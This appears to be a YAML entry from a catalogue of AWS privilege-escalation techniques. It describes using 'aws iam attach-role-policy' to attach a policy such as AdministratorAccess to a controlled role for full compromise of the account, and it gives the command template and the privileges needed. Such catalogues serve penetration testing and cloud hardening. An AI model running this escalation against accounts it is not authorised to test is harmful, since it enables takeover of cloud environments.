---
description: |
    This command should be targeted against a role you control.

    The command attaches a higher privilege policy to a role you control. Depending on the policies allowed within the grant, this permission can be used to apply the **arn:aws:iam::aws:policy/AdministratorAccess** for full compromise of the environment.
details:
    AWS-CLI-command:
        - code: |
            aws iam attach-role-policy --role-name {target role} --policy-arn {target policy arn}
    required-privileges:
        - code: |
            None
    required-configurations:
        - code: |
            A role you are able to assume.
    useful-privileges:
        - code: |
            iam:ListPolicies
            iam:GetPolicy
    sources:
        - code: |
            https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
    submitted-by:
        - code: |
            Lucas Fedyniak-Hopes
---